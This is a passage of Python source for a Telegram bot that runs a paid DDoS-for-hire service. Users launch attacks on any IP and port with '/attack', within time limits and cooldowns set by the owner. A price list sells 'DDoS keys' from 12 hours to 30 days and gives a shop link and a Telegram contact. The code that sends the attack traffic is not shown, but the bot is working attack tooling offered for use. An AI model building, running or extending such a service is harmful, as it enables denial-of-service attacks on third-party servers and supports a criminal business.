            bot.reply_to(message, "❌ Value 0-3600!")
            return
        set_setting('private_cooldown', v)
        bot.reply_to(message, f"✅ Private Cooldown set: {v}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["group_cooldown"])
def group_cooldown_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) == 1:
        bot.reply_to(message, f"⏳ Group Cooldown: {get_group_cooldown()}s")
        return
    try:
        v = int(parts[1])
        if v < 0 or v > 3600:
            bot.reply_to(message, "❌ Value 0-3600!")
            return
        set_setting('group_cooldown', v)
        bot.reply_to(message, f"✅ Group Cooldown set: {v}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["settings"])
def settings_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    cid = get_private_channel_id()
    response = "⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n\n"
    response += f"📱 Private\n• Max: {get_private_max_attack_time()}s\n• CD: {get_private_cooldown()}s\n\n"
    response += f"👥 Group\n• Max: {get_group_max_attack_time()}s\n• CD: {get_group_cooldown()}s\n\n"
    response += f"⚡ Slots: {len(API_LIST)}\n\n"
    response += f"🚫 Blocked IPs: {', '.join(get_blocked_ips())}\n\n"
    response += f"📢 Channel ID: {cid if cid else '❌ NOT SET'}"
    bot.reply_to(message, response)


@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    set_feedback_enabled(True)
    bot.reply_to(message, "✅ Feedback enabled!")


@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    set_feedback_enabled(False)
    bot.reply_to(message, "✅ Feedback disabled!")


# ============================================================
# ===== ✅ /attack COMMAND (1 USER = 1 ATTACK) =====
# ============================================================
@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return

    user_id = message.from_user.id
    is_group = message.chat.type not in ['private', 'personal']

    # Group approval check
    if is_group:
        if not check_group_approval(message):
            return

    # DDoS protection
    if protection.is_ddos_attack(user_id, message.chat.id):
        bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
        return

    # Channel join check
    if not check_channel_join(message):
        return

    # ===== ✅ 1 USER = 1 ATTACK CHECK (Owner bypass) =====
    if not is_owner(user_id):

        # 1. Pending feedback check
        if get_feedback_enabled():
            fb = get_pending_feedback(user_id)
            if fb:
                bot.reply_to(
                    message,
                    f"📸 𝗣𝗘𝗛𝗟𝗘 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗢!\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {fb['target']}:{fb['port']}\n"
                    f"⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {fb['duration']}s\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ Screenshot bhejne ke baad hi naya attack kar sakte ho."
                )
                return

        # 2. Cooldown check
        cooldown = get_user_cooldown(user_id, is_group)
        if cooldown > 0:
            mins = cooldown // 60
            secs = cooldown % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            bot.reply_to(
                message,
                f"⏳ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘!\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🕐 𝗪𝗮𝗶𝘁 𝗸𝗮𝗿𝗼: {time_str}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏱️ Cooldown khatam hone ke baad attack kar sakte ho."
            )
            return

        # 3. ✅ ACTIVE ATTACK CHECK (main rule)
        active = get_user_active_attack(user_id)
        if active:
            remaining = int((active['end_time'] - datetime.now()).total_seconds())
            total = active['duration']
            elapsed = total - remaining
            percent = int((elapsed / total) * 100) if total > 0 else 0
            bar = make_progress_bar(percent)

            bot.reply_to(
                message,
                f"🚫 𝗘𝗞 𝗧𝗜𝗠𝗘 𝗣𝗘 𝗘𝗞 𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞! 🚫\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💢 𝗔𝗰𝘁𝗶𝘃𝗲 𝗧𝗮𝗿𝗴𝗲𝘁: {active['target']}:{active['port']}\n"
                f"⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}s / {total}s\n"
                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Pehle wale attack ke complete hone ka wait karo.\n"
                f"📊 Live status: /status"
            )
            return

    # ===== SLOT AVAILABILITY CHECK =====
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(
            message,
            f"❌ 𝗦𝗔𝗕𝗛𝗜 𝗦𝗟𝗢𝗧𝗦 𝗕𝗨𝗦𝗬! ({active_count}/{max_concurrent})\n"
            f"⏳ Thodi der baad try karo."
        )
        return

    # ===== COMMAND PARSE =====
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(
            message,
            "⚠️ 𝗨𝘀𝗮𝗴𝗲: /attack <ip> <port> <time>\n"
            "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 80 60"
        )
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]

    # IP validate
    if not validate_target(target):
        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗜𝗣!\n📌 Example: 1.1.1.1")
        return

    # ✅ IP blocked check (20. and 52. always blocked)
    if is_ip_blocked(target):
        bot.reply_to(message, f"🚫 𝗬𝗲 𝗜𝗣 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗵𝗮𝗶!\n🎯 {target}\n━━━━━━━━━━━━━━━━━━━━\n❌ 20.x.x.x aur 52.x.x.x allowed nahi hai.")
        return

    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗣𝗼𝗿𝘁! (1-65535)")
            return

        duration = int(duration)
        if is_group:
            max_time = get_group_max_attack_time()
            cooldown_time = get_group_cooldown()
        else:
            max_time = get_private_max_attack_time()
            cooldown_time = get_private_cooldown()

        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(
                message,
                f"❌ 𝗠𝗔𝗫 𝗧𝗜𝗠𝗘 𝗘𝗫𝗖𝗘𝗘𝗗𝗘𝗗!\n"
                f"⏱️ Max allowed: {max_time}s\n"
                f"📌 Tumne diya: {duration}s"
            )
            return

        if duration < 1:
            bot.reply_to(message, "❌ Duration kam se kam 1s hona chahiye!")
            return

        # Free slot lo
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        if api_index is None:
            bot.reply_to(message, "❌ 𝗞𝗼𝗶 𝗳𝗿𝗲𝗲 𝘀𝗹𝗼𝘁 𝗻𝗮𝗵𝗶 𝗺𝗶𝗹𝗮!\n⏳ Thodi der baad try karo.")
            return

        # Register attack
        with _attack_lock:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group
            }

        # Attack start karo
        thread = threading.Thread(
            target=start_attack,
            args=(target, port, duration, message, attack_id, api_index, is_group)
        )
        thread.start()

    except ValueError:
        bot.reply_to(message, "❌ 𝗣𝗼𝗿𝘁 𝗮𝘂𝗿 𝘁𝗶𝗺𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗵𝗼𝗻𝗲 𝗰𝗵𝗮𝗵𝗶𝘆𝗲!")


@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if is_owner(user_id):
        help_text = f'''
👑 OWNER PANEL

📢 /setchannel, /channels
⚡ /attack, /status, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
📢 /addgrp, /removegrp, /groups
🎬 /reel_on, /reel_off, /addreel, /removereel, /listreels
📸 /feedback_on, /feedback_off
🛡️ /ddos_on, /ddos_off
🚫 /block_ip, /unblock_ip
🔧 /maintenance, /ok

🔢 Max Concurrent: {len(API_LIST)}
🚫 Default Blocked: 20. , 52.
'''
    else:
        help_text = f'''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥

• /attack <ip> <port> <time> – ⚡ Launch
• /status – 📊 Live progress
• /verify – ✅ Check channel join
• /id – 🆔 Your ID
• /ping – 🏓 Bot status
• /PAIDDDOSPRICE – 💰 Paid plans

📢 Join: {PRIVATE_CHANNEL_LINK}'''
    bot.reply_to(message, help_text)


# ============================================================
# ===== ✅ /PAIDDDOSPRICE COMMAND =====
# ============================================================
@bot.message_handler(commands=['PAIDDDOSPRICE', 'paidddosprice', 'PaidDdosPrice'])
def paid_ddos_price_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    response = '''💯DDOS SERVER PRICE 😊
════════════════
💵𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗜𝗡𝗚
════════════════

BOT - @DDOSXBOT

Price⬇️
Premium Plan : 300 Second Max Attack Time And Cooldown Of 0 Seconds!
Prices Of  Ddos Key :⬇️

➡️12H : 70💲
➡️1Day : 120💲
➡️3Days : 300💲
➡️7Days : 500💲
➡️30Day : 1500💲

BUY 💰
http://DESTROYLODER.shop
http://DESTROYLODER.shop

BUY MASSAGE 
@GAURAV_BHAI1
@GAURAV_BHAI1'''
    bot.reply_to(message, response)


@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <prefix>")
        return
    if add_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ Blocked: `{parts[1]}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ Already blocked!")


@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_ip <prefix>")
        return
    if parts[1] in DEFAULT_BLOCKED_IPS:
        bot.reply_to(message, f"❌ `{parts[1]}` ko unblock nahi kar sakte (default protection)!", parse_mode="Markdown")
        return
    if remove_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ Unblocked!")
    else:
        bot.reply_to(message, f"❌ Not found!")


@bot.message_handler(commands=["listblocked"])
def list_blocked_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi blocked IP nahi hai.")
        return
    response = "🚫 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 𝗜𝗣 𝗣𝗥𝗘𝗙𝗜𝗫𝗘𝗦\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, prefix in enumerate(blocked, 1):
        marker = " 🔒 (default)" if prefix in DEFAULT_BLOCKED_IPS else ""
        response += f"{i}. `{prefix}`{marker}\n"
    response += f"\nTotal: {len(blocked)}"
    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>")
        return
    set_maintenance(True, parts[1])
    bot.reply_to(message, f"🔧 Maintenance ON!\n{parts[1]}\n\n/ok to turn off")


@bot.message_handler(commands=["ok"])
def ok_command(message):
    if not is_owner(message.from_user.id):
        return
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance already OFF!")
        return
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance OFF!")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return

    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ SET' if get_private_channel_id() else '⚠️ NOT SET'}
🔢 Slots: {len(API_LIST)}
🎬 Reels: {'ON' if get_reel_enabled() else 'OFF'}
📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
🚫 Blocked IPs: {', '.join(get_blocked_ips())}

Use /help for commands.'''
    else:
        response = f'''╔══════════════════╗
🚀 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗙𝗥𝗘𝗘 𝗗𝗗𝗢𝗦 𝗣𝗢𝗪𝗘𝗥
⚡ 𝗕𝗬 @GAURAV_BHAI1
╚══════════════════╝

🔥 𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

➤ "/attack <ip> <port> <time>"
➤ "/status" — Live Progress
➤ "/verify" — Channel Verify
➤ "/help" — Help Menu
➤ "/PAIDDDOSPRICE" — Paid Plans

👑 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥
➜ @GAURAV_BHAI1

📢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
➜ {PRIVATE_CHANNEL_LINK}'''
    bot.reply_to(message, response)


@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    clear_pending_feedback(user_id)
    username = message.from_user.username
    bot.reply_to(message, f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']}")
    try:
        photo = message.photo[-1]
        owner_msg = f"📸 Feedback\n👤 @{username if username else user_id}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
        bot.send_photo(BOT_OWNER, photo.file_id, caption=owner_msg)
    except Exception as e:
        print(f"Feedback forward error: {e}")


@bot.message_handler(content_types=['document', 'video', 'text', 'audio', 'voice', 'sticker'])
def handle_other_feedback(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    content_type = message.content_type
    if content_type == 'text':
        bot.reply_to(message, f"📸 Send screenshot (photo)!\n🎯 {fb['target']}:{fb['port']}")
        return
    clear_pending_feedback(user_id)
    bot.reply_to(message, f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']}")
    try:
        username = message.from_user.username
        owner_msg = f"📎 Feedback\n👤 @{username if username else user_id}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}"
        if content_type == 'document':
            bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
        elif content_type == 'video':
            bot.send_video(BOT_OWNER, message.video.file_id, caption=owner_msg)
        elif content_type == 'audio':
            bot.send_audio(BOT_OWNER, message.audio.file_id, caption=owner_msg)
        elif content_type == 'voice':
            bot.send_voice(BOT_OWNER, message.voice.file_id, caption=owner_msg)
        elif content_type == 'sticker':
            bot.send_sticker(BOT_OWNER, message.sticker.file_id)
            bot.send_message(BOT_OWNER, owner_msg)
    except Exception as e:
        print(f"Feedback forward error: {e}")


def load_saved_channels():
    cid = get_private_channel_id()
    if cid:
        print(f"📢 Private channel loaded: {cid}")
    else:
        print(f"⚠️ Channel ID not set! Run /setchannel <id>")
    # ✅ Ensure blocked IPs initialized
    blocked = get_blocked_ips()
    print(f"🚫 Blocked IP prefixes: {', '.join(blocked)}", flush=True)


# ===== ✅ WEBHOOK CLEANUP FUNCTION =====
def setup_polling():
    """Webhook delete karo aur polling ke liye ready karo"""
    try:
        result = bot.delete_webhook(drop_pending_updates=True)
        print(f"✅ Webhook deleted: {result}", flush=True)
    except Exception as e:
        print(f"⚠️ Webhook delete failed: {e}", flush=True)

    try:
        bot.get_updates(offset=-1, limit=1, timeout=1)
        print("✅ Pending updates cleared", flush=True)
    except Exception as e:
        print(f"⚠️ Update clear failed: {e}", flush=True)


load_saved_channels()
protection.enabled = get_ddos_protection()

print("🔥 BOT STARTING...")
print(f"🌐 API: {API_BASE_URL}")
print(f"🔢 Slots: {API_SLOTS}")
print(f"🚫 Blocked: 20. , 52.")
print("=" * 50)

# ✅ Webhook cleanup (polling se pehle zaroori)
setup_polling()

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        # Crash ke baad phir se webhook cleanup
        try:
            bot.delete_webhook(drop_pending_updates=True)
        except:
            pass
        time.sleep(3)